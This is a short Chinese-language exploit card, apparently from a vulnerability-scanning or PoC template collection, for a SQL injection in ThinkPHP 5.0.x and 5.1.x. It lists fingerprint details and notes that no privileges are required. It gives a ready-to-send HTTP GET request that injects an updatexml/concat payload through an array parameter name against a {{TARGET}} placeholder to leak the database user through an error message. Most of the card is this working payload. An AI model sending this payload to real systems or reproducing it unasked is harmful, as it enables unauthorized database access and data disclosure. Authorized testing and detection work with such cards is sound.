# ThinkPHP SQL 注入 (in-sqlinjection)

## 指纹特征
- 服务: ThinkPHP 5.0.x / 5.1.x
- 端口: 8080 (默认)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| SQL 注入 (数组参数) | `/index.php` | 无 |

## PoC 指令

通过构造包含数组 SQL 注入的请求参数：

```http
GET /index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 HTTP/1.1
Host: {{TARGET}}:8080
```

## Success Signal
- **报错回显**: 页面返回数据库报错，其中包含执行结果 (如用户名)。
